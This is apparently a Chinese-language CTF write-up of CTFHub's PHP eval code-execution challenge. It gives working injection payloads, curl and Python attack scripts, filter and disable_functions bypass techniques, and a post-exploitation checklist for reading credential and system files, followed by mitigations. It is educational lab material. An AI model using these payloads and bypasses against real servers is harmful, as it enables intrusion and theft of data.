---
layout: post
title: CTFHub - RCE eval 执行 Writeup
platform: ctfhub
date: 2026-10-23 18:56:00 +0800
categories: CTF
---

CTFHub - RCE eval 执行 Writeup

一、题目信息

- 平台：CTFHub（技能树 → Web → **RCE** → eval 执行）
- 题型：Web
- 考点：**PHP 代码执行（`eval`）**、`system()` 命令执行


```text
★ 页面源码（直接显示出来了，因为没传 cmd 时走 highlight_file）：

    <?php
    if (isset($_REQUEST['cmd'])) {
        eval($_REQUEST["cmd"]);       // ★ 直接 eval 你的输入
    } else {
        highlight_file(__FILE__);     // 没传参数就显示源码
    }
    ?>

★ 关键点：

    ① eval() 执行的是【PHP 代码】，不是系统命令
       → 传 ls 不行，要传 system('ls');
       → 而且必须有分号结尾

    ② $_REQUEST 同时接受 GET / POST / Cookie
       → ?cmd=... 或 POST cmd=... 或 Cookie: cmd=...

    ③ 完全没有过滤

★ 实测（用 ?cmd= 传 PHP 代码）：

    ?cmd=echo 'RCE-OK';                 → RCE-OK                    ✅
    ?cmd=system('whoami');              → www-data                  ✅
    ?cmd=system('pwd');                 → /var/www/html             ✅
    ?cmd=system('ls -la /');            → 根目录列表                 ✅

★ 找 flag：

    ?cmd=system('ls -la /');
    → -rw-r--r-- 1 root root 33 Oct 23 18:54 flag_652     ← ★ 在根目录

    ?cmd=system('cat /flag_652');
    → ctfhub{36b71d3e3c7c094023860781}

★ 环境信息（顺手收集）：

    PHP 版本:  PHP 5.6.40
    运行用户:  www-data
    网站根:    /var/www/html
    容器:      Docker + Kubernetes（有 .dockerenv、KUBERNETES_* 环境变量）

flag         : ctfhub{36b71d3e3c7c094023860781}
```

二、题目分析

**① 这段代码为什么危险**

```php
eval($_REQUEST["cmd"]);
```

**`eval()` 的作用**：

```
把【字符串】当成【PHP 代码】执行

    $code = "echo 1 + 1;";
    eval($code);          // 等价于直接写 echo 1 + 1;

★ 它不检查字符串内容
★ 它是一句"把字符串变成代码"的指令
```

**所以**：

```
?cmd=phpinfo();                       → 执行 phpinfo()
?cmd=system('id');                    → 执行系统命令 id
?cmd=$a=1;echo $a+1;                  → 输出 2
?cmd=file_get_contents('/flag_652');  → 读文件
```

**② `eval` 和 `system` 的区别（新手最容易混）**

| | `eval()` | `system()` |
|---|---|---|
| **执行什么** | **PHP 代码** | **系统命令（shell）** |
| 例子 | `eval("echo 1+1;")` | `system("ls -la")` |
| 传 `ls` | ❌ 语法错误（PHP 里没这个变量/函数）| ✅ 执行 `ls` |
| 要执行 `ls` | `eval("system('ls');")` | `system("ls")` |
| 返回值 | null | 命令输出的最后一行 |

**★ 本题是 `eval`，所以必须写 `system('命令');`**

**最常见的错误**：

```
❌ ?cmd=ls
   → eval("ls")  → PHP 认为 ls 是个常量 → 报错

✅ ?cmd=system('ls');
   → eval("system('ls');") → 执行 shell 命令 ls
```

**③ `eval` 为什么必须加分号**

```php
eval("echo 1")     // ❌ 语法错误：Parse error
eval("echo 1;")    // ✅ 正确（分号是 PHP 语句结束符）
```

**★ 因为 `eval` 要求传入的是"完整的 PHP 语句"。**

**④ `$_REQUEST` 意味着三个入口**

```php
$_REQUEST = $_GET + $_POST + $_COOKIE（按 variables_order 合并）
```

**所以三种传法都能打**：

```bash
# GET
curl "http://target/?cmd=system('id');"

# POST
curl -X POST "http://target/" -d "cmd=system('id');"

# Cookie
curl "http://target/" -H "Cookie: cmd=system('id');"
```

**★ 有 WAF 只拦 GET 参数时，可以换 POST 或 Cookie 试。**

**⑤ `highlight_file(__FILE__)` 是什么**

```php
highlight_file(__FILE__);
// __FILE__ = 当前文件的完整路径
// highlight_file() = 把 PHP 源码【语法高亮】后输出

★ 这是 CTF 里常见的"源码泄露"手法
★ 很多题目的"源码"就是靠它显示的
```

**⑥ 这题没有任何过滤**

```php
eval($_REQUEST["cmd"]);      // 原样 eval
```

**对比"有过滤"的题**：

```php
// 常见过滤方式（都能绕）
if (strpos($cmd, 'system') !== false) die('no');
// 绕过：用 exec()、passthru()、shell_exec()、反引号

if (preg_match('/[a-z]/i', $cmd)) die('no');
// 绕过：用无字母 payload（异或、自增）

if (strlen($cmd) > 20) die('too long');
// 绕过：用短函数名、$_GET 二次传参
```

**★ 本题连过滤都没有，是最简单的 RCE。**

三、解题步骤

**第 1 步：看源码**

```
直接访问首页（不带参数）：
    http://challenge-xxx:10800/

→ 页面显示 PHP 源码（highlight_file）

    <?php
    if (isset($_REQUEST['cmd'])) {
        eval($_REQUEST["cmd"]);
    } else {
        highlight_file(__FILE__);
    }
    ?>
```

**第 2 步：测试代码执行**

```
http://challenge-xxx:10800/?cmd=phpinfo();

→ 看到一大页 PHP 配置信息 → 说明 eval 成功
```

**或者更轻量**：

```
?cmd=echo 'RCE-OK';
→ 页面显示 RCE-OK
```

**第 3 步：执行系统命令**

```
?cmd=system('whoami');
→ www-data

?cmd=system('pwd');
→ /var/www/html

?cmd=system('ls -la');
→ 当前目录列表
```

**★ 注意分号！`system('id');` 末尾的 `;` 不能少。**

**第 4 步：找 flag**

```
?cmd=system('ls -la /');
→ 看到 /flag_652     ← ★ 在根目录

?cmd=system('cat /flag_652');
→ ctfhub{36b71d3e3c7c094023860781}
```

**第 5 步：提交 → 通关**

---

**更省事的写法：反引号**

```php
?cmd=echo `ls -la /`;
```

**`` ` `` 在 PHP 里等于 `shell_exec()`**：

```php
echo `whoami`;         // 等价于 echo shell_exec('whoami');
```

**所以最短的命令执行**：

```
?cmd=echo `cat /flag_652`;
```

---

**自动化脚本**

```python
import ssl, urllib.parse, urllib.request

CTX = ssl.create_default_context()
CTX.check_hostname = False
CTX.verify_mode = ssl.CERT_NONE

BASE = "http://challenge-xxx:10800"


def php(code):
    """执行 PHP 代码，返回输出"""
    u = BASE + "/?cmd=" + urllib.parse.quote(code)
    with urllib.request.urlopen(u, context=CTX, timeout=20) as r:
        return r.read().decode('utf-8', 'replace')


# 一行拿 flag
print(php("system('ls -la /');"))
print(php("system('cat /flag_652');"))
```

**★ 关键就是 `urllib.parse.quote()` 编码** —— 因为代码里有 `'`、`(`、`;` 这些字符。

**如果浏览器地址栏直接输**：

```
http://challenge-xxx:10800/?cmd=system('ls -la /');
```

**浏览器会自动编码，通常能直接工作。**

---

**用 POST（GET 被 WAF 拦时）**

```bash
curl -X POST "http://challenge-xxx:10800/" \
     -d "cmd=system('cat /flag_652');"
```

**用 Cookie（更隐蔽）**

```bash
curl "http://challenge-xxx:10800/" \
     -H "Cookie: cmd=system('cat /flag_652');"
```

四、延伸知识

**① PHP 里能执行命令/代码的函数大全**

**代码执行类**（执行 PHP 代码）：

```php
eval($code);                    // 执行 PHP 代码
assert($code);                   // PHP 5/7 早期可执行代码
preg_replace('/e', $code, '');   // PHP 5.5 前 /e 修饰符（已废弃）
create_function('', $code);      // PHP 7.2 前
call_user_func($func, $arg);     // 调用任意函数
array_map($func, $arr);          // 同上
usort($arr, $func);              // 同上
```

**系统命令类**（执行 shell 命令）：

```php
system($cmd);        // 执行并输出
exec($cmd);          // 执行，返回最后一行
shell_exec($cmd);    // 执行，返回全部输出
passthru($cmd);      // 执行并原样输出（二进制安全）
popen($cmd, 'r');    // 打开进程
proc_open($cmd, ...);// 更底层
`$cmd`               // 反引号 = shell_exec
pcntl_exec($cmd);    // 需要 pcntl 扩展
```

**文件相关（能读 flag）**：

```php
highlight_file('/flag_652');
show_source('/flag_652');
file_get_contents('/flag_652');
readfile('/flag_652');
file('/flag_652');
fopen('/flag_652', 'r');
include('/flag_652');
```

**★ 如果 `system` 被禁用了，试试这些**：

```
system → exec → shell_exec → passthru → popen → 反引号
如果全被禁用 → 用文件函数读（file_get_contents）
如果连文件函数也被禁 → 用 scandir + fopen 组合
```

**② 常见过滤与绕过**

**（1）过滤函数名**

```php
if (stripos($cmd, 'system') !== false) die('no');

# 绕过 1：换函数
?cmd=exec('cat /flag_652');
?cmd=passthru('cat /flag_652');
?cmd=echo `cat /flag_652`;

# 绕过 2：拼接（如果 eval，可以直接拼函数名）
?cmd=$a='sys'.'tem';$a('cat /flag_652');

# 绕过 3：大小写（PHP 函数名不区分大小写）
?cmd=SyStEm('cat /flag_652');

# 绕过 4：用变量函数
?cmd=$f='system';$f('cat /flag_652');
```

**（2）过滤关键字（如 flag）**

```php
if (strpos($cmd, 'flag') !== false) die('no');

# 绕过 1：通配符
?cmd=system('cat /fla*');
?cmd=system('cat /f*');

# 绕过 2：变量拼接
?cmd=$a='fla';system("cat /{$a}g_652");

# 绕过 3：base64
?cmd=system(base64_decode('Y2F0IC9mbGFnXzY1Mg=='));
```

**（3）禁用函数（disable_functions）**

```ini
disable_functions = system,exec,shell_exec,passthru
```

**绕过方法**：

```
① 用没被禁的：popen、proc_open、pcntl_exec、反引号
② 用 LD_PRELOAD 劫持
③ 用 PHP 的 GC UAF 漏洞（需特定版本）
④ 用蚁剑/冰蝎的绕过插件
⑤ 如果只是读文件 → file_get_contents 通常没禁
```

**（4）过滤括号**

```php
if (strpos($cmd, '(') !== false) die('no');

# 绕过：用反引号（不需要括号）
?cmd=echo `cat /flag_652`;

# 或者用 include
?cmd=include"/flag_652";     （PHP 里 include 可以不加括号）
```

**（5）无字母数字（极端情况）**

```php
if (!preg_match('/[a-zA-Z0-9]/', $cmd)) die('no');

# 绕过：PHP 的"无字母数字 webshell"
#   ~异或、自增运算符、位运算

# 经典 payload（PHP 7）：
?cmd=$_=~'%86%95%95%9A%8C';$_();
# 或者用 (PHP 8 不支持字符串自增了)
```

**③ 命令执行 vs 代码执行的区别**

```
代码执行（本题）：
    注入点：eval() / assert() / include()
    你能写：PHP 语法
    危害：能调任意 PHP 函数 → 间接执行命令
    例子：?cmd=system('id');

命令执行：
    注入点：system($_GET['ip']) / exec() / 反引号
    你能写：shell 语法
    危害：直接执行系统命令
    例子：?ip=127.0.0.1; whoami

★ 本题是"代码执行"，但通过 system() 达成了"命令执行"
```

**④ 常见的"代码执行"入口**

```php
// 直接 eval
eval($_GET['code']);

// 模板引擎
$smarty->display($_GET['tpl']);       // SSTI

// 文件包含
include($_GET['page']);                // 配合日志/图片马

// 反序列化
unserialize($_GET['data']);            // 魔术方法链

// 变量覆盖
extract($_GET);                        // 覆盖任意变量
parse_str($_SERVER['QUERY_STRING']);   // 同上

// 动态函数调用
$func = $_GET['f']; $func();           // 调用任意函数
```

**⑤ 拿到 RCE 后该做什么（信息收集清单）**

```bash
# 我是谁
whoami
id
hostname

# 系统
uname -a
cat /etc/os-release
cat /etc/passwd

# 找 flag
ls -la /
find / -name "flag*" 2>/dev/null
find / -name "*.txt" 2>/dev/null | head -20
grep -r "ctfhub{" / 2>/dev/null

# 敏感信息
env                         # 环境变量
cat /var/www/html/config.php
ls -la /var/www/html/
cat ~/.bash_history

# 网络
ip a / ifconfig
netstat -an
cat /etc/hosts

# 提权线索
sudo -l
find / -perm -4000 -type f 2>/dev/null    # SUID 文件
crontab -l
```

**⑥ 防护**

```text
① ★ 永远不要用 eval 处理用户输入（最根本）
② 危险函数加白名单：
     $allowed = ['strlen', 'strtolower'];
     if (!in_array($func, $allowed)) die();
③ disable_functions 禁用危险函数
     disable_functions = system,exec,shell_exec,passthru,popen,proc_open,pcntl_exec
④ 禁用 eval 相关的扩展
⑤ PHP 的 open_basedir 限制文件访问范围
⑥ 用新版本 PHP（PHP 8 弃用了 assert 的字符串执行等）
⑦ 最小权限运行（www-data 而不是 root）
⑧ 容器隔离（本题是 Docker，所以 RCE 只影响容器）
```

五、总结

- **本题核心：`eval($_REQUEST['cmd'])` → 直接执行 PHP 代码 → 用 `system()` 执行系统命令。**
- 三步：

```text
① ?cmd=system('whoami');        → www-data
② ?cmd=system('ls -la /');      → 看到 /flag_652
③ ?cmd=system('cat /flag_652'); → ctfhub{...}
```

- **三个必记要点**：

```text
① eval 执行的是 PHP 代码，不是 shell 命令
   → 要写 system('ls'); 而不是 ls
② 末尾分号不能少（eval 要求完整语句）
③ 简写：?cmd=echo `ls -la /`;   （反引号 = shell_exec）
```

- **实测 flag**：

```text
ctfhub{36b71d3e3c7c094023860781}
（在根目录 /flag_652）
```

**手工复现要点**：

```text
· 先不带参数访问 → 看源码（highlight_file）
· 确认是 eval 还是 system 拼接
   eval → 写 system('cmd');
   拼接 → 直接写 cmd
· 找 flag：ls -la / （根目录最常见）
· 如果 system 被禁 → 换 exec / passthru / 反引号 / file_get_contents
```

**一句话记忆**：

```
┌──────────────────────────────────────────────────────┐
│  eval("字符串") = 把字符串当 PHP 代码执行              │
│  system("命令") = 执行系统命令                         │
│                                                      │
│  所以 eval 型注入要写：system('ls');                   │
│  而不是：ls                                           │
│                                                      │
│  ★ 这是新手最常犯的错                                  │
└──────────────────────────────────────────────────────┘
```
